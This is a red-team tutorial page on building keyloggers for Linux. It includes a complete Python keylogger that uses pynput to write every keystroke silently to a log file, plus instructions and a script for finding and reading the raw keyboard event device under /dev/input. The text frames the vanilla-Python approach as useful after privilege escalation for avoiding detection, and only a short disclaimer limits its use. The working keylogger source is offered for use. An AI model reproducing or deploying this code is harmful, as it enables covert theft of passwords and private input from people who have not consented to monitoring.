# **Potentially Unwanted Programs (PUPs) - Key Logging in Linux**

![alt text](https://github.com/0x00wolf/red-team-cookbook/blob/main/imgs/github.jpeg)

Malware performs unwanted or malicious actions on the target system or network. Including logging keystrokes, stealing credentials, dropping malware, exfiltrating data, or being used to flood a server with packets in a larger DDoS campaign. Malware is often disguised as legitimate or useful software, or bundled with other programs, to trick the user into installing or running it. Malware can also be delivered through phishing emails, drive-by downloads, or exploit kits, which take advantage of vulnerabilities in the target system or application. 

The title Malware holds a level of mystique that I believe is largely attributed to actions of its developers. In every case, Malware is performing a legitimate function, but for illegitimate reasons. Malware performs systems and network functions, utilizing operating system API calls, standard encryption techniques, and socket programming. A RAT that generates a zombie is a malicious system daemon, which performs a regular service without the user's consent, or working directly against their best interests.

With this in mind, as I have no malicious intent with the Malware that I program, I prefer to call them Potentially Unwanted Programs (PUPs). Part of my aim with the RTCB, is to develop my own skills further in cryptography, and network & systems programming.

# **Disclaimer**

Any program that logs key strokes globally has major security and privacy implications. Do not test the following unless you are using a device you own, and if so make any other users of that device aware immediately. The author does not condone the use of the following programs for the unlawful monitoring of other user's keystrokes. 

# **First, Set up a Virtual Environments to Test your PUPs**

Before you start developing your own potentially unwanted programs (PUPs), you need to set up a safe and isolated environment where you can test them without affecting your main system or network. On top of this, the RTCB suggests creating **virtual environments** specifc to the packages required for each PUP to simplify compiling with Nuitka. Venvs are self-contained directories that contain a Python installation and any packages you need for your project. Virtual environments allow you to create and switch between multiple Python environments, each with its own dependencies and settings. This way, you can avoid conflicts between different versions of packages or libraries, and keep your system clean and secure.

To create a virtual environment, you need the **venv** module, which is included in the standard library of Python 3. You can use the following command to create a new virtual environment in the specified directory:

```bash
python -m venv /path/to/new/virtual/environment
```

This command will create the directory if it doesn't exist already, and place a **pyvenv.cfg** file in it with a **home** key pointing to the Python installation from which the command was run. A common name for the directory is **.venv**. The command will also create a **bin** (or **Scripts** on Windows) subdirectory containing a copy or symlink of the Python binary or binaries, depending on the platform or arguments used at environment creation time. Additionally, it will create an (initially empty) **lib/pythonX.Y/site-packages** subdirectory (on Windows, this is **Lib\site-packages**), where X and Y are the major and minor version numbers of Python.


**To activate the virtual environment, you need to run the following command:**

```bash
source ./venv/bin/activate
```

This will change your prompt to show that you are in the virtual environment, and modify the **PATH** environment variable to include the bin directory of the virtual environment. This way, you can use the Python interpreter and any packages installed in the virtual environment without specifying the full path. To deactivate the virtual environment, you can simply type **deactivate**.

Pip is typically out of date in a new venv. To update pip use:

```bash
pip install --upgrade pip
```

Now that you have set up your virtual environment, you are ready to start developing your own PUPs.

---


# **Key Loggers: The Black Box - Capturing Keyboard Input with Pynput**

The black box keylogger works on all platforms thanks the excellent library by Moses Palmer: https://github.com/moses-palmer/pynput

First, create & activate a new virtual environment and install the necessary library for this PUP with:

```bash
pip install pynput
```

The Black Box uses **queue**, **threading**, and **pynput** modules. The queue module provides a way to store and retrieve items in a first-in, first-out (FIFO) order, and also manages thread locking for you. The threading module provides a way to run a function in a separate thread of execution.

---

## **Black Box:**

```python
# by 0x00wolf:
import queue
import threading
from pynput import keyboard


def worker():
    key_string = ''
    while True:
        key = q.get()
        try:
            key_string += str(key.char)
        except AttributeError:
            if key == key.space:
                key_string += ' '
            elif key == key.backspace:
                key_string = key_string[:-1]
            elif key == key.shift:
                pass
            elif key == key.enter:
                key_string += '\\n'
            elif key == key.alt:
                pass
            elif key == key.tab:
                pass
            elif key == key.ctrl:
                pass
            else:
                key_string += str(key)

        if len(key_string) >= 20:
            with open('logfile.txt', 'a') as f:
                f.write(key_string)
            key_string = ''

        q.task_done()


def on_press(key):
    q.put(key)


q = queue.Queue()  # 1) Create a Queue object
t = threading.Thread(target=worker)  # 2) Initialize the worker function in a separate Thread
t.start()  
listener = keyboard.Listener(on_press=on_press)  # 3) Initialize the Pynput Listener object
listener.start()
```

---

## **The Black Box keylogger works as follows:**

1) It creates a queue object that will store the key events.
2) It creates a thread object that will run a worker function in the background. The worker function will get the key events from the queue, convert them to strings, and append them to a key_string variable. It will also handle some special keys, such as space, backspace, enter, and shift, by adding the appropriate characters to the key_string. If the key_string reaches a certain length (20 in this example), it will open a file named logfile.txt in append mode and write the key_string to it. Then, it will reset the key_string to an empty string.
3) It creates a keyboard listener object that will monitor the keyboard events and call an on_press function for each key press. The on_press function will simply put the key event into the queue.

The queue and threading is to ensure that the pynput module doesn't block the main thread while listening to the keyboard events. You can learn more about the pynput module from https://pynput.readthedocs.io/.

# **Vanilla Python Keylogger - Interpreting /dev/input/ events**

Linux expands the concept of a file to every component of your computer. Each device attached to your computer will have a corresponding file that represents a binary stream of input data, which lives in the `/dev/input/` directory. To listen to keystrokes globally on a Linux box, we need the account we are using to have reading rights to the input events, which generally will be limited to root access. 

Almost all Linux boxes will have an installation of Python. Therefore, if you have been able to escalate privileges, but don’t have an installation of Pip, or are concerned that a download might trigger additional scrutiny, the ability to whip up a keylogger in vanilla Python could be advantageous. You could accomplish the same thing in a lower level language, but chances are Python will be there, and it’s significantly more complex to implement parsing of the event structs in C.

## **Exploring /dev/input**

**To view the different event streams running in your computer:**

```bash
ls -l /dev/input/ 
```

**To discover which event is mapped to the keyboard you can use the following command:**

```bash
cat /proc/bus/input/devices
```

**Which returns a list of all the devices currently mapped to your computer and their associated event codes. To save some time:**
 
```bash
cat /proc/bus/input/devices | grep keyboard -A 8
```

**Look for the number associated with the event from the information that is returned.**

## **You can determine which event is associated with the keyboard programmatically with:**

I adapted this script from code I read @ The Hacker's Diary: https://thehackerdiary.wordpress.com/2017/04/21/exploring-devinput-1/


```python
import struct
import sys
from datetime import datetime


def get_keyboard_event_file(token_to_look_for):
    """This function iterates through /proc/bus/input/devices and prints out the information for the keyboard including the event file."""
    section = ""
    event_name = ""

    with open("/proc/bus/input/devices", "r") as fp:
        for line in fp:
            if line.strip() == "":
                if token_to_look_for in section and "mouse" not in section.lower():
                    print(f"Found [{token_to_look_for}] in:\n{section}")
                    for section_line in section.split('\n'):
                        if "Handlers=" in section_line.strip() and event_name == "":
                            print(f"Found Handlers line: [{section_line}]")
                            event_name = section_line.strip().split(' ')[-1]
                            print(f"Found event_name [{event_name}]")
                            return "/dev/input/" + event_name
                section = ""
            else:
                section += line

    if event_name == "":
        raise Exception(f"No event name was found for the token [{token_to_look_for}]")


if __name__ == '__main__':
    keyboard_event_file = ""
    try:
        keyboard_event_file = get_keyboard_event_file("EV=120013")
    except Exception as err:
        print(f"Couldn't get the keyboard event file due to error [{str(err)}]")
    print(keyboard_event_file)
```

**Look for the number associated with the event from the information that is returned.**

## **View the Binary Data Stream**

**Having identified your event code we can use cat to examine the binary data from the keyboards input:**

```bash
sudo cat /dev/input/eventX
```

**Type something and watch the binary data stream appear...**

## **Interpreting the binary event stream:**

**The structure of the binary data is found in the Linux docs:** https://www.kernel.org/doc/Documentation/input/input.txt

The keycodes for the keys being pressed can be extracted via a struct object, which is comprised as follows:

```c
struct input_event {
	struct timeval time;
	unsigned short type;
	unsigned short code;
	unsigned int value;
};
```
The first 16 bits contain the system time, and the next 8 bits contain the event code and the value. The value can be 1 for pressed, 2 for held, or 0 for released.

**You can use `cat` to view Linux's extensive set of keycodes using:**

```bash
cat /usr/include/linux/input-event-codes.h
```

**or at Linus Torvald's Linux Kernel repo:** https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/include/uapi/linux/input-event-codes.h

## Viewing Input Event Struct Event Codes & Values

